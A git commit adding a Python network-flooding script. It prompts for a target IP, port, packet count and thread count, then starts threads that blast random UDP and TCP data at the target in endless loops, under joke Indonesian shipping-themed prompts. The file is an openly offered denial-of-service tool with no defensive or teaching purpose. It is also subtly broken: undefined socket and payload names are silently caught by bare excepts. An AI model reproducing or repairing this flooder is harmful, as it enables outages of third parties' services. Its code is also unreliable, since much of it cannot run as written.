851e5c794c6e8bde29c113fbe9561f68f2de44a9
Xs-ECS <109500807+Xs-ECS@users.noreply.github.com>
2022-08-04 14:14:12 +0700

    Add files via upload

---
+++ new.py
@@ -0,0 +1,267 @@
+import random
+import socket
+import threading
+import os,sys
+import sys
+import time
+os.system("clear")
+
+#//------------------------------------------//
+fsubs = True
+tpings = True
+pscans = True
+liips = True
+tattacks = True
+uaid = True
+said = True
+running = True
+iaid = True
+haid = True
+aid = True
+attack = True
+ldap = True
+http = True
+atks = True
+#//------------------------------------------//
+print("\033[91m               LOADED SCRIPT")
+print("\033[91m Loading.")
+time.sleep(1)
+print("\033[91m Loading..")
+time.sleep(1)
+print("\033[91m Loading...")
+time.sleep(1)
+print("\033[91m Loading....")
+time.sleep(1)
+print("\033[91m Loading.....")
+time.sleep(1)
+#//------------------------------------------//
+os.system("clear")
+#//------------------------------------------///
+print("\033[91m               Script Loaded")
+time.sleep(5)
+#//------------------------------------------//
+os.system("clear")
+#//------------------------------------------//
+print("\033[92m           ATTACKING FOR 5 SECOND")
+time.sleep(5)
+#//------------------------------------------//
+os.system("clear")
+time.sleep(2)
+print('''\033[1;31;40m
+░██████╗██╗░░██╗░█████╗░██████╗░███████╗
+██╔════╝██║░░██║██╔══██╗██╔══██╗██╔════╝
+╚█████╗░███████║██║░░██║██████╔╝█████╗░░
+░╚═══██╗██╔══██║██║░░██║██╔═══╝░██╔══╝░░
+██████╔╝██║░░██║╚█████╔╝██║░░░░░███████╗
+╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚══════╝
+
+░█████╗░███████╗██████╗░░█████╗░████████╗
+██╔══██╗██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
+██║░░╚═╝█████╗░░██████╔╝███████║░░░██║░░░
+██║░░██╗██╔══╝░░██╔═══╝░██╔══██║░░░██║░░░
+╚█████╔╝███████╗██║░░░░░██║░░██║░░░██║░░░
+░╚════╝░╚══════╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
+''')
+print("\033[94m")
+ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+choice = str(input("GAS ATTACK(y/n):"))
+times = int(input("PAKET SHOPE IP13PROMAX:"))
+threads = int(input("ONGKOS KURIR:"))
+
+os.system("clear")
+def run():
+  data = random._urandom(666)
+  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      addr = (str(ip),int(port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      for x in range(times):
+        s.sendto(data,addr)
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        print(i +" PAKET SHOPE IP13PROMAX OTW!!!!")
+    except:
+      print("[=+=+=+] PAKET SHOPE IP13PROMAX OTW!!!!")
+
+def run2():
+  data = random._urandom(666)
+  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      #addr = (str(ip),int(port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        print(i +" PAKET SHOPE IP13PROMAX OTW!!!!")
+    except:
+      s.close()
+      print("[=+=+=+] PAKET SHOPE IP13PROMAX OTW!!!!")
+
+def run3():
+  data = random._urandom(666)
+  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      #addr = (str(ip),int(port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        print(i +" PAKET SHOPE IP13PROMAX OTW!!!!")
+    except:
+      s.close()
+      print("[=+=+=+] PAKET SHOPE IP13PROMAX OTW!!!!")
+
+def run4():
+  data = random._urandom(666)
+  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      #addr = (str(ip),int(port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        print(i +" PAKET SHOPE IP13PROMAX OTW!!!!")
+    except:
+      s.close()
+      print("[=+=+=+] PAKET SHOPE IP13PROMAX OTW!!!!")
+
+def run5():
+  data = random._urandom(666)
+  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s = sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      #addr = (str(ip),int(port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      sock.sendto(payload, (ip, port))
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        sock.sendto(payload, (ip, port))
+        print(i +" PAKET SHOPE IP13PROMAX OTW!!!!")
+    except:
+      s.close()
+      print("[=+=+=+] PAKET SHOPE IP13PROMAX OTW!!!!")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+    th = threading.Thread(target = run2)
+    th.start()
+    th = threading.Thread(target = run3)
+    th.start()
+else:
+    th = threading.Thread(target = run4)
+    th.start()
+    th = threading.Thread(target = run5)
+    th.start()
